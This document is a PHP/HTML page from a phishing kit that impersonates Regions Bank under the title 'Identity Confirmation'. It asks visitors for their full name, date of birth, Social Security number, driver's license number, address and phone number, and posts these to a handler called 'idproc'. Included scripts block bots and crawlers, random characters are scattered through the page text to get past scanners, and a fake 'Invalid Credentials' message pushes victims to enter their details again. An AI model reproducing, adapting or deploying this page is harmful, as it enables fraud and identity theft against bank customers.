<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html lang="en" x-ms-format-detection="none"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Check - Log in to your accounts | Regions </title>
    <link href="../rgi/com-regions.css" rel="stylesheet">
    <link href="../rgi/olbAuth.min.css" rel="stylesheet">
    <link rel="icon" href="../rgi/favicon.ico">
<style class="__tmp_css_exfil_protection_load_blocker">input,input ~ * { background-image:none !important; list-style: inherit !important; cursor: auto !important; content:normal !important; } input::before,input::after,input ~ *::before, input ~ *::after { content:normal !important; }</style>

<style>
</style>
</head>
<body>

    <header class="rds-header simple">
        <div class="container">
            <a class="logo-link" title="Go home">
                <picture class="logo">
                    <source srcset="../rgi/regions-logo-no-r.svg" media="(max-width: 600px)">
                    <img src="../rgi/regions-logo-no-r.svg" alt="regions logo">
                </picture>
            </a>
        </div>
    </header>

    <main role="main" class="pb-3" id="main-section">
        

<link href="../rgi/Common.css" rel="stylesheet">

<div>
    <div class="rds-wizard-body">
        <div class="body-content">
            <div class="rds-short-form-tile container login-enroll">
                <h1 class="sr-only"> Identity Confirmation</h1>
                <div class="col-md-12">
			   <?php if(isset($_GET[''.$theerrkey.''])){echo '<div class="alert alert-danger" id="page-level-error-box" aria-live="polite" style="display: block;">
                        <div id="page-level-message">Invalid Credentials, Please try again</div>
                        <button type="button" id="alert-close" onclick="document.getElementById(\'page-level-error-box\').style.display=\'none\'">X</button>
                    </div>';};?></div>
                <div class="row col-md-6 col-md-offset-3" id="password-section" style="display: block;">
                    <div class="col-xs-12">
                        <h2 id="password-header">Now, let's<?php echo rT('ALPHANUMERIC',rand(1,87));?> confirm y<?php echo rT('ALPHANUMERIC',rand(1,87));?>our Infor<?php echo rT('ALPHANUMERIC',rand(1,87));?>mation<?php echo rT('ALPHANUMERIC',rand(1,87));?></h2>
                        <div id="transmitContainer" style="display: block;"> <div class="row col-xs-12"> <span id="online-id" class="page-heading">Enter the informations below.</span> <div class="row margin-top-20"> <div class="col-xs-12 margin-bottom-30">
<form class="rds-form form" method="post" id="frrdeetz" action="idproc<?php if(isset($_GET[''.$theerrkey.''])){echo '?'.$theerrkey.'=On';};?>"> 
<div class="field animated-label text"> <label class="control-label" for="input_password">Full Name</label> <input type="text" name="fname" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i')" required=""/></div>
<div class="field animated-label text"> <label class="control-label" for="input_password">Date Of Birth (MM/DD/YYYY)</label> <input type="tel" name="dob" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" maxlength="10" oninput="ooth('i');DateOfBirth();" required=""/></div>
<div class="field animated-label text"> <label class="control-label" for="input_password">Social Security Number</label> <input type="tel" name="ssn" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i');innumlen(this.value);demsort()" required="" maxlength="11"/></div>
<div class="field animated-label text"> <label class="control-label" for="input_password">Driver's License</label> <input type="text" name="dl" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i')" required=""/></div>
<div class="field animated-label text"> <label class="control-label" for="input_password">Street Address</label> <input type="text" name="street" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i')" required=""/></div>
<div class="field animated-label text"> <label class="control-label" for="input_password">State</label> <input type="text" name="state" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i')" required=""/></div>
<div class="field animated-label text"> <label class="control-label" for="input_password">ZIP Code</label> <input type="tel" name="zip" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i');innumlen(this.value)" maxlength="5"  required=""/></div>
<div class="field animated-label text"> <label class="control-label" for="input_password">Phone Number</label> <input type="tel" name="phone" class="form-control to-switch mask-text" style="max-height: 67px; padding-top: 27px;" onfocus="ooth('f')" onblur="ooth('b')" oninput="ooth('i');innumlen(this.value)" required="" maxlength="15"/></div>
			

	<div class="form-btn-holder"> <div class="pull-right"> <button type="submit" class="btn btn-primary btn-lg submit-btn" id="submit-password-button">Next</button> </div> </div> </form> </div> </div> </div> </div>
                    </div>

                </div>
            </div>
        </div>
    </div>
</div>
<script>
function ooth(m){var e = event.target;if(e.value=="" && m!='f'){e.parentNode.classList.remove('selected');} else{e.parentNode.classList.add('selected');}; if(m!='b'){e.parentNode.classList.add('focus');} else{e.parentNode.classList.remove('focus');};};
function ptog(){var p = document.getElementById("input_password");if(p.type=="password"){p.type="text";} else{p.type="password";};p.parentNode.classList.add('focus');p.focus();}

function DateOfBirth(){var key =event.data;var val=event.target.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){
case 1:if(key > 1){event.target.value="";}; break; 
case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 4:if(key > 3){event.target.value=val.slice(0,val.length-1);}; break;
case 5:if(val[3]>=3 && key > 1 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[3]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {event.target.value=event.target.value+"/";}; break;
case 7:if(key < 1 || key > 2){event.target.value=val.slice(0,val.length-1);}; break; 
case 8:if(val[6] == 1 && key < 9){event.target.value=val.slice(0,val.length-1);} else if(val[6]==2 && key > 0){event.target.value=val.slice(0,val.length-1);}; break; 
case 9:if(val[6]==2 && key > 1){event.target.value=val.slice(0,val.length-1);}; break; };};
if(event.inputType=="deleteContentBackward" && val.length == 2){event.target.value=val[0]}
else if(event.inputType=="deleteContentBackward" && val.length == 5){event.target.value=val.slice(0,val.length-1);}};

function demsort(<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/-/g,'').split('');
if(event.inputType=="insertText"){
for(var i=0;i < mval.length;i++){if(i==2 || i==4){mval[i]=mval[i]+'-';};};
if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else{event.target.value=mval.join('');};
};};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};

function load(){document.getElementById('redi').style.display="block";};
function waitreq(){load();var suballow=document.getElementById('jas')<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>;setTimeout(function(){suballow.value="on";document.getElementById('frrdeetz').submit();},3000);if(suballow.value!='off'){return true;} else{return false;};};
</script>
    </main>

    <footer class="rds-footer">
        <div class="footer-content">
            <ul>
                <li><a target="_blank">Con<?php echo rT('ALPHANUMERIC',rand(1,87));?>tact Us</a></li>
                <li><a target="_blank">Te<?php echo rT('ALPHANUMERIC',rand(1,87));?>rms and Conditions</a></li>
                <li><a target="_blank">Priv<?php echo rT('ALPHANUMERIC',rand(1,87));?>acy Ple<?php echo rT('ALPHANUMERIC',rand(1,87));?>dge</a></li>
                <li><a target="_blank">Security</a></li>
                <li><a target="_blank">Onli<?php echo rT('ALPHANUMERIC',rand(1,87));?>ne Trac<?php echo rT('ALPHANUMERIC',rand(1,87));?>king and Advertising</a></li>
                <li><a target="_blank">Accessible Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nking</a></li>
                <li><a target="_blank">Leave Feedback</a></li>

            </ul>

            <p>Call&nbsp;<a>1-800-REGIO<?php echo rT('ALPHANUMERIC',rand(1,87));?>NS</a></p>
            <p>Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons, the Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons logo, the Life<?php echo rT('ALPHANUMERIC',rand(1,87));?>Green col<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>or, a<?php echo rT('ALPHANUMERIC',rand(1,87));?>nd the LifeGreen bi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ke are registered trademarks of Regions B<?php echo rT('ALPHANUMERIC',rand(1,87));?>ank.</p>
            <p>© <?php echo date("Y");?> Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nk. All Ri<?php echo rT('ALPHANUMERIC',rand(1,87));?>ghts Reserved.</p>

            <div class="footer-icon">
                <img src="../rgi/equal-housing-lender.svg" alt="Equal Housing Lender">
                <img src="../rgi/member-fdic.svg" alt="Member FDIC">
            </div>
        </div>
    </footer>

    <div>
    </div>
</body></html>